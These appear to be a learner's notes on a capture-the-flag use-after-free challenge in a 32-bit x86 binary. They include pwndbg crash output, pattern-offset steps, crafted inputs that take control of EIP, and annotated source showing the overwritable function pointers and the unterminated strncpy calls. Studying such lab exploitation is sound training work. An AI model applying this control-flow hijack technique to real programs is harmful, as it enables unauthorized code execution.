@@ -1,0 +1,206 @@
+heap UAF
+
+
+pwndbg> r
+Starting program: /root/lab/ch63_UAFx86/63
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+1
+How do you name him?
+111111111111111111111111111111111111
+You buy a new dog. 111111111111111111111111111111111111 is a good name for him
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+4
+111111111111bUVbUVXcUV run under a car... 111111111111bUVbUVXcUV 0-1 car
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+5
+Where do you build it?
+222222222222222222222222222222
+How do you name it?
+3333333333333333333333333333333
+You build a new dog house.
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+6
+222222222222222233333333 lives in 222222222222222233333333.
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+3
+Bring me the flag 222222222222222233333333!!!
+222222222222222233333333 prefers to bark...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x32323232 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────
+ EAX  0x32323232 ('2222')
+ EBX  0x5655860c (_GLOBAL_OFFSET_TABLE_) ◂— add    al, 0x35 /* 0x3504 */
+ ECX  0x0
+ EDX  0x565571f5 ◂— add    byte ptr [eax], al
+ EDI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ ESI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ EBP  0xffffd1e8 ◂— 0x0
+ ESP  0xffffd18c —▸ 0x565567f2 (main+527) ◂— jmp    0x565568ac
+ EIP  0x32323232 ('2222')
+──────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
+Invalid address 0x32323232
+
+
+
+
+
+
+
+
+
+
+───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
+00:0000│ esp  0xffffd18c —▸ 0x565567f2 (main+527) ◂— jmp    0x565568ac
+01:0004│      0xffffd190 ◂— 0x31310000
+02:0008│      0xffffd194 ◂— 0x31313131 ('1111')
+... ↓
+─────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
+ ► f 0 32323232
+   f 1 565567f2 main+527
+   f 2 f7ddfef1 __libc_start_main+241
+Program received signal SIGSEGV (fault address 0x32323232)
+
+
+
+
+
+root@kali:~/lab/ch63_UAFx86# pattern_create -l 32
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+root@kali:~/lab/ch63_UAFx86# pattern_offset -q 0x41346141
+[*] Exact match at offset 12
+
+
+
+
+=============================================================================================
+=============================================================================================
+
+
+EIP Overwrite
+
+You build a new dog house.
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+3
+Bring me the flag 222222222222BBBB3333!!!
+222222222222BBBB3333 prefers to bark...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────
+ EAX  0x42424242 ('BBBB')
+ EBX  0x5655860c (_GLOBAL_OFFSET_TABLE_) ◂— add    al, 0x35 /* 0x3504 */
+ ECX  0x0
+ EDX  0x565571f5 ◂— add    byte ptr [eax], al
+ EDI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ ESI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ EBP  0xffffd1e8 ◂— 0x0
+ ESP  0xffffd18c —▸ 0x565567f2 (main+527) ◂— jmp    0x565568ac
+ EIP  0x42424242 ('BBBB')
+──────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
+Invalid address 0x42424242
+
+
+
+
+
+
+
+
+
+
+───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
+00:0000│ esp  0xffffd18c —▸ 0x565567f2 (main+527) ◂— jmp    0x565568ac
+01:0004│      0xffffd190 ◂— 0x31310000
+02:0008│      0xffffd194 ◂— 0x3131 /* '11' */
+03:000c│      0xffffd198 ◂— 0x0
+... ↓
+─────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
+ ► f 0 42424242
+   f 1 565567f2 main+527
+   f 2 f7ddfef1 __libc_start_main+241
+Program received signal SIGSEGV (fault address 0x42424242)
+
+
+
+
+Warning:  If there is no null byte among the first n bytes of src, 
+the string placed in dest will not be null-terminated.
+
+If  the  length of src is less than n, strncpy() writes additional null
+bytes to dest to ensure that a total of n bytes are written.
+
+eraseNl(line);    // removes Null byte, allowing you to enter 64 bytes
+
+
+struct Dog {
+    char name[12];  <---------------- Overwrite
+    void (*bark)();
+    void (*bringBackTheFlag)();
+    void (*death)(struct Dog*);
+};
+
+
+struct DogHouse* newDogHouse(){
+    char line[BUFLEN] = {0};
+
+    struct DogHouse* dogHouse = malloc(sizeof(struct DogHouse));
+
+    puts("Where do you build it?");
+    fgets(line, BUFLEN, stdin);
+    eraseNl(line);                          // Removes Null byte
+    strncpy(dogHouse->address, line, 16);   <- NO NULL before 16 bytes
+
+    puts("How do you name it?");
+    fgets(line, 64, stdin);
+    eraseNl(line);                          // Removes Null byte
+    strncpy(dogHouse->name, line, 8);       // NO NULL before 8
+
+    puts("You build a new dog house.");
+
+    return dogHouse;
+
